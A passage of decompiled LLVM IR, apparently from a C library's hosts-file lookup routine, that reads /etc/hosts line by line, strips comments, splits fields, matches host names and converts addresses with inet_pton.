  br i1 %v3_1b498, label %dec_label_pc_1b77c, label %dec_label_pc_1b4a0

dec_label_pc_1b4a0:                               ; preds = %dec_label_pc_1b498
  store i32 %v2_1b498, i32* %r2.global-to-local, align 4
  %v2_1b4a4 = add i32 %v1_1b478, %tmp61
  store i32 %v2_1b4a4, i32* @r4, align 4
  br label %dec_label_pc_1b4a8

dec_label_pc_1b4a8:                               ; preds = %entry, %dec_label_pc_1b4a0
  %v0_1b4b8 = phi i32 [ %tmp61, %entry ], [ %v2_1b4a4, %dec_label_pc_1b4a0 ]
  %v0_1b4bc = phi i32 [ %tmp57, %entry ], [ %v2_1b498, %dec_label_pc_1b4a0 ]
  %tmp = icmp ult i32 %v0_1b4bc, 32
  br i1 %tmp, label %dec_label_pc_1b77c, label %dec_label_pc_1b4b0

dec_label_pc_1b4b0:                               ; preds = %dec_label_pc_1b4a8
  store i32 %v0_1b488, i32* %r0.global-to-local, align 4
  %v7_1b4b4 = icmp eq i32 %v0_1b488, 1
  %v1_1b4b8 = add i32 %v0_1b4b8, 32
  store i32 %v1_1b4b8, i32* @fp, align 4
  %v1_1b4bc = add i32 %v0_1b4bc, -32
  store i32 %v1_1b4bc, i32* @r8, align 4
  br i1 %v7_1b4b4, label %dec_label_pc_1b5e8, label %dec_label_pc_1b4c4

dec_label_pc_1b4c4:                               ; preds = %dec_label_pc_1b4b0
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1b4d0 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_1b4d0, align 4
  %tmp80 = icmp ult i32 %v1_1b4bc, 4
  br i1 %tmp80, label %dec_label_pc_1b77c, label %dec_label_pc_1b4d8

dec_label_pc_1b4d8:                               ; preds = %dec_label_pc_1b4c4
  %v0_1b4d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b4d8 = add i32 %v0_1b4d8, -36
  store i32 %v1_1b4d8, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_1b4d8, 8
  br i1 %tmp81, label %dec_label_pc_1b77c, label %dec_label_pc_1b4e4

dec_label_pc_1b4e4:                               ; preds = %dec_label_pc_1b4d8
  %v0_1b4e4 = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_1b4e4, 16
  br i1 %tmp82, label %dec_label_pc_1b77c, label %dec_label_pc_1b4ec

dec_label_pc_1b4ec:                               ; preds = %dec_label_pc_1b4e4
  %v1_1b4ec = add i32 %v0_1b4d8, -48
  store i32 %v1_1b4ec, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_1b4ec, 8
  br i1 %tmp83, label %dec_label_pc_1b77c, label %dec_label_pc_1b4f8

dec_label_pc_1b4f8:                               ; preds = %dec_label_pc_1b4ec
  %v1_1b4f8 = add i32 %v0_1b4d8, -44
  store i32 %v1_1b4f8, i32* @r8, align 4
  %v1_1b4fc = add i32 %v0_1b4d8, -56
  store i32 %v1_1b4fc, i32* %r3.global-to-local, align 4
  %v3_1b500 = icmp ult i32 %v1_1b4fc, %v1_1b4f8
  br i1 %v3_1b500, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1b4f8
  %v1_1b508 = load i32, i32* @r4, align 4
  %v2_1b508 = add i32 %v1_1b508, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_1b4f8
  store i32 %v1_1b4fc, i32* @r8, align 4
  %v1_1b50c.pre = load i32, i32* @r4, align 4
  %v2_1b50c = add i32 %v1_1b50c.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_1b50c, %.thread1 ], [ %v2_1b508, %bb ]
  %v0_1b514 = phi i32 [ %v1_1b50c.pre, %.thread1 ], [ %v1_1b508, %bb ]
  %v0_1b510 = phi i32 [ %v1_1b4fc, %.thread1 ], [ %v1_1b4f8, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_1b514 = add i32 %v0_1b514, 36
  store i32 %v1_1b514, i32* @r6, align 4
  %v1_1b518 = add i32 %v0_1b514, 48
  store i32 %v1_1b518, i32* @sl, align 4
  %tmp84 = icmp ult i32 %v0_1b510, 80
  br i1 %tmp84, label %dec_label_pc_1b77c, label %dec_label_pc_1b520

dec_label_pc_1b520:                               ; preds = %bb74
  %v0_1b520 = call i32 @__open_etc_hosts()
  store i32 %v0_1b520, i32* %r0.global-to-local, align 4
  %v2_1b524 = icmp eq i32 %v0_1b520, 0
  br i1 %v2_1b524, label %dec_label_pc_1b540, label %.thread

.thread:                                          ; preds = %dec_label_pc_1b520
  %v1_1b52c = load i32, i32* @fp, align 4
  store i32 %v1_1b52c, i32* @r7, align 4
  %v1_1b530 = load i32, i32* @r5, align 4
  store i32 %v1_1b530, i32* @fp, align 4
  %v1_1b534 = load i32, i32* @r6, align 4
  %v1_1b538 = load i32, i32* @sl, align 4
  br label %dec_label_pc_1b5f4

dec_label_pc_1b540:                               ; preds = %dec_label_pc_1b520
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_1b548 = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_1b548, align 4
  %v0_1b54c = call i32 @__errno_location()
  store i32 %v0_1b54c, i32* %r0.global-to-local, align 4
  %v1_1b550 = inttoptr i32 %v0_1b54c to i32*
  %v2_1b550 = load i32, i32* %v1_1b550, align 4
  store i32 %v2_1b550, i32* @sl, align 4
  br label %dec_label_pc_1b780

dec_label_pc_1b558:                               ; preds = %dec_label_pc_1b708
  %v0_1b558 = load i32, i32* @r4, align 4
  %v1_1b558 = add i32 %v0_1b558, 4
  %v2_1b558 = inttoptr i32 %v1_1b558 to i32*
  %v3_1b558 = load i32, i32* %v2_1b558, align 4
  %v1_1b55c = load i32, i32* @sb, align 4
  %v2_1b55c = inttoptr i32 %v1_1b55c to i32*
  store i32 %v3_1b558, i32* %v2_1b55c, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_1b570 = load i32, i32* @r4, align 4
  %v1_1b570 = add i32 %v0_1b570, 8
  store i32 %v1_1b570, i32* %r1.global-to-local, align 4
  %v1_1b574 = load i32, i32* @sb, align 4
  %v2_1b574 = add i32 %v1_1b574, 8
  %v3_1b574 = inttoptr i32 %v2_1b574 to i32*
  store i32 2, i32* %v3_1b574, align 4
  %v0_1b578 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1b578, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_1b580 = load i32, i32* @sb, align 4
  %v1_1b580 = load i32, i32* %ip.global-to-local, align 4
  %v2_1b580 = inttoptr i32 %v1_1b580 to i32*
  store i32 %v0_1b580, i32* %v2_1b580, align 4
  %v0_1b584 = load i32, i32* @r7, align 4
  %v1_1b584 = load i32, i32* %r0.global-to-local, align 4
  %v2_1b584 = inttoptr i32 %v1_1b584 to i32*
  store i32 %v0_1b584, i32* %v2_1b584, align 4
  %v0_1b588 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b588 = load i32, i32* @sb, align 4
  %v2_1b588 = add i32 %v1_1b588, 12
  %v3_1b588 = inttoptr i32 %v2_1b588 to i32*
  store i32 %v0_1b588, i32* %v3_1b588, align 4
  %v0_1b58c = load i32, i32* %r0.global-to-local, align 4
  %v1_1b58c = load i32, i32* @sb, align 4
  %v2_1b58c = add i32 %v1_1b58c, 16
  %v3_1b58c = inttoptr i32 %v2_1b58c to i32*
  store i32 %v0_1b58c, i32* %v3_1b58c, align 4
  %v0_1b590 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b590 = load i32, i32* @sb, align 4
  %v2_1b590 = add i32 %v1_1b590, 4
  %v3_1b590 = inttoptr i32 %v2_1b590 to i32*
  store i32 %v0_1b590, i32* %v3_1b590, align 4
  %v0_1b594 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b594 = load i32, i32* %r0.global-to-local, align 4
  %v2_1b594 = add i32 %v1_1b594, 4
  %v3_1b594 = inttoptr i32 %v2_1b594 to i32*
  store i32 %v0_1b594, i32* %v3_1b594, align 4
  br label %dec_label_pc_1b764

dec_label_pc_1b59c:                               ; preds = %dec_label_pc_1b730
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_1b5a0 = load i32, i32* @r4, align 4
  %v1_1b5a0 = add i32 %v0_1b5a0, 4
  %v2_1b5a0 = inttoptr i32 %v1_1b5a0 to i32*
  %v3_1b5a0 = load i32, i32* %v2_1b5a0, align 4
  store i32 %v3_1b5a0, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_1b5a8 = load i32, i32* @sb, align 4
  %v2_1b5a8 = inttoptr i32 %tmp53 to i32*
  store i32 %v0_1b5a8, i32* %v2_1b5a8, align 4
  store i32 %v0_1b600, i32* %ip.global-to-local, align 4
  %v0_1b5b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b5b0 = load i32, i32* @sb, align 4
  %v2_1b5b0 = inttoptr i32 %v1_1b5b0 to i32*
  store i32 %v0_1b5b0, i32* %v2_1b5b0, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1b5bc = load i32, i32* %ip.global-to-local, align 4
  %v1_1b5bc = load i32, i32* %r0.global-to-local, align 4
  %v2_1b5bc = inttoptr i32 %v1_1b5bc to i32*
  store i32 %v0_1b5bc, i32* %v2_1b5bc, align 4
  %v0_1b5c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b5c0 = load i32, i32* @sb, align 4
  %v2_1b5c0 = add i32 %v1_1b5c0, 12
  %v3_1b5c0 = inttoptr i32 %v2_1b5c0 to i32*
  store i32 %v0_1b5c0, i32* %v3_1b5c0, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_1b5cc = load i32, i32* @r4, align 4
  %v1_1b5cc = add i32 %v0_1b5cc, 8
  store i32 %v1_1b5cc, i32* %r1.global-to-local, align 4
  %v0_1b5d0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1b5d0, i32* @sl, align 4
  %v1_1b5d4 = load i32, i32* @sb, align 4
  %v2_1b5d4 = add i32 %v1_1b5d4, 8
  %v3_1b5d4 = inttoptr i32 %v2_1b5d4 to i32*
  store i32 10, i32* %v3_1b5d4, align 4
  %v0_1b5d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b5d8 = load i32, i32* @sb, align 4
  %v2_1b5d8 = add i32 %v1_1b5d8, 16
  %v3_1b5d8 = inttoptr i32 %v2_1b5d8 to i32*
  store i32 %v0_1b5d8, i32* %v3_1b5d8, align 4
  %v0_1b5dc = load i32, i32* %r1.global-to-local, align 4
  %v1_1b5dc = load i32, i32* @sb, align 4
  %v2_1b5dc = add i32 %v1_1b5dc, 4
  %v3_1b5dc = inttoptr i32 %v2_1b5dc to i32*
  store i32 %v0_1b5dc, i32* %v3_1b5dc, align 4
  %v0_1b5e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b5e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_1b5e0 = add i32 %v1_1b5e0, 4
  %v3_1b5e0 = inttoptr i32 %v2_1b5e0 to i32*
  store i32 %v0_1b5e0, i32* %v3_1b5e0, align 4
  br label %dec_label_pc_1b764

dec_label_pc_1b5e8:                               ; preds = %dec_label_pc_1b4b0
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_1b5f4

dec_label_pc_1b5f4:                               ; preds = %.thread, %dec_label_pc_1b5e8
  %v2_1b604.pre-phi = phi i32* [ %v2_1b4d0, %.thread ], [ %.pre, %dec_label_pc_1b5e8 ]
  %v0_1b600 = phi i32 [ %v1_1b52c, %.thread ], [ 0, %dec_label_pc_1b5e8 ]
  %stack_var_-40.1 = phi i32 [ %v1_1b538, %.thread ], [ 0, %dec_label_pc_1b5e8 ]
  %stack_var_-48.1 = phi i32 [ %v1_1b534, %.thread ], [ 0, %dec_label_pc_1b5e8 ]
  %stack_var_-52.0 = phi i32 [ %v0_1b520, %.thread ], [ %v0_1b480, %dec_label_pc_1b5e8 ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* %ip.global-to-local, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_1b604.pre-phi, align 4
  %v2_1b6c8 = inttoptr i32 %v0_1b484 to i8*
  %v7_1b700 = icmp eq i32 %v0_1b47c, 2
  %v7_1b728 = icmp eq i32 %v0_1b47c, 10
  br label %dec_label_pc_1b74c

dec_label_pc_1b60c:                               ; preds = %dec_label_pc_1b74c
  %v0_1b60c = load i32, i32* @fp, align 4
  store i32 %v0_1b60c, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_1b614 = call i32 @__GI_strchr(i32 %v0_1b60c, i32 35)
  store i32 %v2_1b614, i32* %r0.global-to-local, align 4
  %v3_1b618 = icmp eq i32 %v2_1b614, 0
  br i1 %v3_1b618, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_1b60c
  %v0_1b62011 = load i32, i32* @fp, align 4
  store i32 %v0_1b62011, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_1b68c.preheader

bb75:                                             ; preds = %dec_label_pc_1b60c
  %v3_1b614 = inttoptr i32 %v2_1b614 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1b620 = load i32, i32* @fp, align 4
  store i32 %v0_1b620, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_1b614, align 1
  %v0_1b68c30.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b68c.preheader

dec_label_pc_1b68c.preheader:                     ; preds = %bb75, %.thread10
  %v0_1b68c30 = phi i32 [ %v0_1b68c30.pre, %bb75 ], [ %v0_1b62011, %.thread10 ]
  %v1_1b68c31 = inttoptr i32 %v0_1b68c30 to i8*
  %v2_1b68c32 = load i8, i8* %v1_1b68c31, align 1
  %v3_1b68c33 = zext i8 %v2_1b68c32 to i32
  store i32 %v3_1b68c33, i32* %r3.global-to-local, align 4
  %v2_1b69034 = icmp eq i8 %v2_1b68c32, 0
  br i1 %v2_1b69034, label %dec_label_pc_1b698, label %dec_label_pc_1b638.preheader

dec_label_pc_1b630:                               ; preds = %dec_label_pc_1b644
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_1b634 = inttoptr i32 %v8_1b65c to i8*
  store i8 0, i8* %v3_1b634, align 1
  %v4_1b634 = load i32, i32* %r2.global-to-local, align 4
  %v5_1b634 = add i32 %v4_1b634, 1
  store i32 %v5_1b634, i32* %r2.global-to-local, align 4
  %v1_1b638 = inttoptr i32 %v5_1b634 to i8*
  %v2_1b638 = load i8, i8* %v1_1b638, align 1
  %v3_1b638 = zext i8 %v2_1b638 to i32
  store i32 %v3_1b638, i32* %r1.global-to-local, align 4
  %v2_1b63c = icmp eq i8 %v2_1b638, 0
  br i1 %v2_1b63c, label %dec_label_pc_1b698, label %dec_label_pc_1b644

dec_label_pc_1b644:                               ; preds = %dec_label_pc_1b638.preheader, %dec_label_pc_1b630
  %v8_1b65c = phi i32 [ %v5_1b634, %dec_label_pc_1b630 ], [ %v0_1b63820, %dec_label_pc_1b638.preheader ]
  %v1_1b64c = phi i32 [ %v3_1b638, %dec_label_pc_1b630 ], [ %v3_1b63823, %dec_label_pc_1b638.preheader ]
  %v2_1b648 = load i32, i32* @global_var_2abb8, align 4
  store i32 %v2_1b648, i32* %r3.global-to-local, align 4
  %v3_1b64c = mul nuw nsw i32 %v1_1b64c, 2
  %v4_1b64c = add i32 %v3_1b64c, %v2_1b648
  %v5_1b64c = inttoptr i32 %v4_1b64c to i8*
  %v6_1b64c = load i8, i8* %v5_1b64c, align 1
  %v8_1b64c = zext i8 %v6_1b64c to i32
  store i32 %v8_1b64c, i32* %r3.global-to-local, align 4
  %v1_1b650 = and i32 %v8_1b64c, 32
  %v2_1b650 = icmp eq i32 %v1_1b650, 0
  br i1 %v2_1b650, label %dec_label_pc_1b658, label %dec_label_pc_1b630

dec_label_pc_1b658:                               ; preds = %dec_label_pc_1b644
  %v0_1b658 = load i32, i32* @r6, align 4
  %v7_1b65c = icmp slt i32 %v0_1b658, 7
  br i1 %v7_1b65c, label %bb76, label %dec_label_pc_1b66c.preheader

bb76:                                             ; preds = %dec_label_pc_1b658
  %v9_1b65c = load i32, i32* @r4, align 4
  %v13_1b65c = mul i32 %v0_1b658, 4
  %v14_1b65c = add i32 %v9_1b65c, %v13_1b65c
  %v15_1b65c = inttoptr i32 %v14_1b65c to i32*
  store i32 %v8_1b65c, i32* %v15_1b65c, align 4
  %v8_1b660 = load i32, i32* @r6, align 4
  %v9_1b660 = add i32 %v8_1b660, 1
  store i32 %v9_1b660, i32* @r6, align 4
  %v0_1b66c25.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b66c.preheader

dec_label_pc_1b66c.preheader:                     ; preds = %bb76, %dec_label_pc_1b658
  %v0_1b66c25 = phi i32 [ %v0_1b66c25.pre, %bb76 ], [ %v8_1b65c, %dec_label_pc_1b658 ]
  %v1_1b66c26 = inttoptr i32 %v0_1b66c25 to i8*
  %v2_1b66c27 = load i8, i8* %v1_1b66c26, align 1
  %v3_1b66c28 = zext i8 %v2_1b66c27 to i32
  store i32 %v3_1b66c28, i32* %r1.global-to-local, align 4
  %v2_1b67029 = icmp eq i8 %v2_1b66c27, 0
  br i1 %v2_1b67029, label %dec_label_pc_1b68c.loopexit, label %dec_label_pc_1b678.lr.ph

dec_label_pc_1b678.lr.ph:                         ; preds = %dec_label_pc_1b66c.preheader
  %v2_1b67c.pre = load i32, i32* @global_var_2abb8, align 4
  br label %dec_label_pc_1b678

dec_label_pc_1b668:                               ; preds = %dec_label_pc_1b678
  %v1_1b668 = add i32 %v0_1b668, 1
  store i32 %v1_1b668, i32* %r2.global-to-local, align 4
  %v1_1b66c = inttoptr i32 %v1_1b668 to i8*
  %v2_1b66c = load i8, i8* %v1_1b66c, align 1
  %v3_1b66c = zext i8 %v2_1b66c to i32
  store i32 %v3_1b66c, i32* %r1.global-to-local, align 4
  %v2_1b670 = icmp eq i8 %v2_1b66c, 0
  br i1 %v2_1b670, label %dec_label_pc_1b68c.loopexit, label %dec_label_pc_1b678

dec_label_pc_1b678:                               ; preds = %dec_label_pc_1b678.lr.ph, %dec_label_pc_1b668
  %v0_1b668 = phi i32 [ %v0_1b66c25, %dec_label_pc_1b678.lr.ph ], [ %v1_1b668, %dec_label_pc_1b668 ]
  %v1_1b680 = phi i32 [ %v3_1b66c28, %dec_label_pc_1b678.lr.ph ], [ %v3_1b66c, %dec_label_pc_1b668 ]
  store i32 %v2_1b67c.pre, i32* %r3.global-to-local, align 4
  %v3_1b680 = mul nuw nsw i32 %v1_1b680, 2
  %v4_1b680 = add i32 %v3_1b680, %v2_1b67c.pre
  %v5_1b680 = inttoptr i32 %v4_1b680 to i8*
  %v6_1b680 = load i8, i8* %v5_1b680, align 1
  %v8_1b680 = zext i8 %v6_1b680 to i32
  store i32 %v8_1b680, i32* %r3.global-to-local, align 4
  %v1_1b684 = and i32 %v8_1b680, 32
  %v2_1b684 = icmp eq i32 %v1_1b684, 0
  br i1 %v2_1b684, label %dec_label_pc_1b668, label %dec_label_pc_1b68c.loopexit

dec_label_pc_1b68c.loopexit:                      ; preds = %dec_label_pc_1b678, %dec_label_pc_1b668, %dec_label_pc_1b66c.preheader
  %v0_1b68c = phi i32 [ %v0_1b66c25, %dec_label_pc_1b66c.preheader ], [ %v0_1b668, %dec_label_pc_1b678 ], [ %v1_1b668, %dec_label_pc_1b668 ]
  %v1_1b68c = inttoptr i32 %v0_1b68c to i8*
  %v2_1b68c = load i8, i8* %v1_1b68c, align 1
  %v3_1b68c = zext i8 %v2_1b68c to i32
  store i32 %v3_1b68c, i32* %r3.global-to-local, align 4
  %v2_1b690 = icmp eq i8 %v2_1b68c, 0
  br i1 %v2_1b690, label %dec_label_pc_1b698, label %dec_label_pc_1b638.preheader

dec_label_pc_1b638.preheader:                     ; preds = %dec_label_pc_1b68c.preheader, %dec_label_pc_1b68c.loopexit
  %v0_1b63820 = phi i32 [ %v0_1b68c, %dec_label_pc_1b68c.loopexit ], [ %v0_1b68c30, %dec_label_pc_1b68c.preheader ]
  %v1_1b63821 = inttoptr i32 %v0_1b63820 to i8*
  %v2_1b63822 = load i8, i8* %v1_1b63821, align 1
  %v3_1b63823 = zext i8 %v2_1b63822 to i32
  store i32 %v3_1b63823, i32* %r1.global-to-local, align 4
  %v2_1b63c24 = icmp eq i8 %v2_1b63822, 0
  br i1 %v2_1b63c24, label %dec_label_pc_1b698, label %dec_label_pc_1b644

dec_label_pc_1b698:                               ; preds = %dec_label_pc_1b68c.loopexit, %dec_label_pc_1b638.preheader, %dec_label_pc_1b630, %dec_label_pc_1b68c.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1b69c = load i32, i32* @r6, align 4
  %v1_1b6a0 = load i32, i32* @r4, align 4
  %v5_1b6a0 = mul i32 %v0_1b69c, 4
  %v6_1b6a0 = add i32 %v1_1b6a0, %v5_1b6a0
  %v7_1b6a0 = inttoptr i32 %v6_1b6a0 to i32*
  store i32 0, i32* %v7_1b6a0, align 4
  %v7_1b6a4 = icmp sgt i32 %v0_1b69c, 1
  br i1 %v7_1b6a4, label %dec_label_pc_1b6a8, label %dec_label_pc_1b74c

dec_label_pc_1b6a8:                               ; preds = %dec_label_pc_1b698
  %v2_1b6a8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1b6a8, i32* %r0.global-to-local, align 4
  %v7_1b6ac = icmp eq i32 %v2_1b6a8, 1
  br i1 %v7_1b6ac, label %dec_label_pc_1b780, label %dec_label_pc_1b6b4

dec_label_pc_1b6b4:                               ; preds = %dec_label_pc_1b6a8
  %v7_1b6b4 = icmp eq i32 %v2_1b6a8, 2
  br i1 %v7_1b6b4, label %dec_label_pc_1b6c0, label %dec_label_pc_1b6ec.preheader

dec_label_pc_1b6ec.preheader:                     ; preds = %dec_label_pc_1b6b4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1b6ec

dec_label_pc_1b6c0:                               ; preds = %dec_label_pc_1b6b4
  store i32 %v0_1b484, i32* %r0.global-to-local, align 4
  %v0_1b6c4 = load i32, i32* @r4, align 4
  %v1_1b6c4 = inttoptr i32 %v0_1b6c4 to i32*
  %v2_1b6c4 = load i32, i32* %v1_1b6c4, align 4
  store i32 %v2_1b6c4, i32* @r1, align 4
  %v3_1b6c8 = call i32 @__GI_strcoll(i8* %v2_1b6c8, i32 %v2_1b6c4)
  store i32 %v3_1b6c8, i32* %r0.global-to-local, align 4
  %v2_1b6cc = icmp eq i32 %v3_1b6c8, 0
  br i1 %v2_1b6cc, label %dec_label_pc_1b6fc, label %dec_label_pc_1b74c

dec_label_pc_1b6d8:                               ; preds = %dec_label_pc_1b6ec
  %v0_1b6d8 = load i32, i32* @r4, align 4
  %v4_1b6d8 = mul i32 %v1_1b6d8, 4
  %v5_1b6d8 = add i32 %v0_1b6d8, %v4_1b6d8
  %v6_1b6d8 = inttoptr i32 %v5_1b6d8 to i32*
  %v7_1b6d8 = load i32, i32* %v6_1b6d8, align 4
  store i32 %v7_1b6d8, i32* %r1.global-to-local, align 4
  %v3_1b6dc = call i32 @__GI_strcasecmp(i8* %v2_1b6c8, i32 %v7_1b6d8)
  store i32 %v3_1b6dc, i32* %r0.global-to-local, align 4
  %v2_1b6e0 = icmp eq i32 %v3_1b6dc, 0
  %v0_1b6e4 = load i32, i32* @r5, align 4
  %v1_1b6e4 = add i32 %v0_1b6e4, 1
  store i32 %v1_1b6e4, i32* @r5, align 4
  br i1 %v2_1b6e0, label %dec_label_pc_1b6fc, label %dec_label_pc_1b6ec

dec_label_pc_1b6ec:                               ; preds = %dec_label_pc_1b6ec.preheader, %dec_label_pc_1b6d8
  %v1_1b6d8 = phi i32 [ 1, %dec_label_pc_1b6ec.preheader ], [ %v1_1b6e4, %dec_label_pc_1b6d8 ]
  %v1_1b6ec = load i32, i32* @r6, align 4
  store i32 %v0_1b484, i32* %r0.global-to-local, align 4
  %v5_1b6f4 = icmp slt i32 %v1_1b6d8, %v1_1b6ec
  br i1 %v5_1b6f4, label %dec_label_pc_1b6d8, label %dec_label_pc_1b74c

dec_label_pc_1b6fc:                               ; preds = %dec_label_pc_1b6d8, %dec_label_pc_1b6c0
  store i32 %v0_1b47c, i32* %r1.global-to-local, align 4
  br i1 %v7_1b700, label %dec_label_pc_1b708, label %dec_label_pc_1b724

dec_label_pc_1b708:                               ; preds = %dec_label_pc_1b6fc
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1b70c = load i32, i32* @r7, align 4
  store i32 %v0_1b70c, i32* %r2.global-to-local, align 4
  %v0_1b710 = load i32, i32* @r4, align 4
  %v1_1b710 = inttoptr i32 %v0_1b710 to i32*
  %v2_1b710 = load i32, i32* %v1_1b710, align 4
  store i32 %v2_1b710, i32* %r1.global-to-local, align 4
  %v3_1b714 = inttoptr i32 %v2_1b710 to i8*
  %v4_1b714 = call i32 @inet_pton(i32 2, i8* %v3_1b714, i32 %v0_1b70c)
  store i32 %v4_1b714, i32* %r0.global-to-local, align 4
  %v5_1b71c = icmp sgt i32 %v4_1b714, 0
  br i1 %v5_1b71c, label %dec_label_pc_1b558, label %dec_label_pc_1b748

dec_label_pc_1b724:                               ; preds = %dec_label_pc_1b6fc
  store i32 %v0_1b47c, i32* %r2.global-to-local, align 4
  br i1 %v7_1b728, label %dec_label_pc_1b730, label %dec_label_pc_1b748

dec_label_pc_1b730:                               ; preds = %dec_label_pc_1b724
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1b734 = load i32, i32* @r4, align 4
  %v1_1b734 = inttoptr i32 %v0_1b734 to i32*
  %v2_1b734 = load i32, i32* %v1_1b734, align 4
  store i32 %v2_1b734, i32* %r1.global-to-local, align 4
  store i32 %v0_1b600, i32* %r2.global-to-local, align 4
  %v3_1b73c = inttoptr i32 %v2_1b734 to i8*
  %v4_1b73c = call i32 @inet_pton(i32 10, i8* %v3_1b73c, i32 %v0_1b600)
  store i32 %v4_1b73c, i32* %r0.global-to-local, align 4
  %v5_1b744 = icmp sgt i32 %v4_1b73c, 0
  br i1 %v5_1b744, label %dec_label_pc_1b59c, label %dec_label_pc_1b748

dec_label_pc_1b748:                               ; preds = %dec_label_pc_1b708, %dec_label_pc_1b724, %dec_label_pc_1b730
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_1b74c

dec_label_pc_1b74c:                               ; preds = %dec_label_pc_1b6ec, %dec_label_pc_1b6c0, %dec_label_pc_1b698, %dec_label_pc_1b748, %dec_label_pc_1b5f4
  %v0_1b74c = load i32, i32* @fp, align 4
  store i32 %v0_1b74c, i32* %r0.global-to-local, align 4
  %v0_1b750 = load i32, i32* @r8, align 4
  store i32 %v0_1b750, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_1b758 = call i32 @fgets(i32 %v0_1b74c, i32 %v0_1b750, i32 %stack_var_-52.0)
  store i32 %v3_1b758, i32* %r0.global-to-local, align 4
  %v2_1b75c = icmp eq i32 %v3_1b758, 0
  br i1 %v2_1b75c, label %dec_label_pc_1b764, label %dec_label_pc_1b60c

dec_label_pc_1b764:                               ; preds = %dec_label_pc_1b74c, %dec_label_pc_1b59c, %dec_label_pc_1b558
  %v2_1b764 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1b764, i32* %r3.global-to-local, align 4
  %v7_1b768 = icmp eq i32 %v2_1b764, 1
  br i1 %v7_1b768, label %dec_label_pc_1b780, label %dec_label_pc_1b770

dec_label_pc_1b770:                               ; preds = %dec_label_pc_1b764
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_1b774 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_1b774 = call i32 @__GI_fclose(i8* %v1_1b774)
  store i32 %v2_1b774, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b780

dec_label_pc_1b77c:                               ; preds = %dec_label_pc_1b498, %bb74, %dec_label_pc_1b4ec, %dec_label_pc_1b4e4, %dec_label_pc_1b4d8, %dec_label_pc_1b4c4, %dec_label_pc_1b4a8
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_1b780

dec_label_pc_1b780:                               ; preds = %dec_label_pc_1b6a8, %dec_label_pc_1b764, %dec_label_pc_1b770, %dec_label_pc_1b540, %dec_label_pc_1b77c
  %v0_1b780 = load i32, i32* @sl, align 4
  store i32 %v0_1b780, i32* %r0.global-to-local, align 4
  store i32 %v3_1b468, i32* @r4, align 4
  store i32 %v6_1b468, i32* @r5, align 4
  store i32 %v12_1b468, i32* @r7, align 4
  store i32 %v15_1b468, i32* @r8, align 4
  store i32 %v21_1b468, i32* @sl, align 4
  store i32 %v24_1b468, i32* @fp, align 4
  ret i32 %v0_1b780

; uselistorder directives
  uselistorder i32 %v1_1b6d8, { 1, 0 }
  uselistorder i32 %v0_1b69c, { 1, 0 }
  uselistorder i32 %v3_1b63823, { 1, 0 }
  uselistorder i32 %v0_1b63820, { 1, 0 }
  uselistorder i32 %v2_1b614, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_1b514, { 1, 0 }
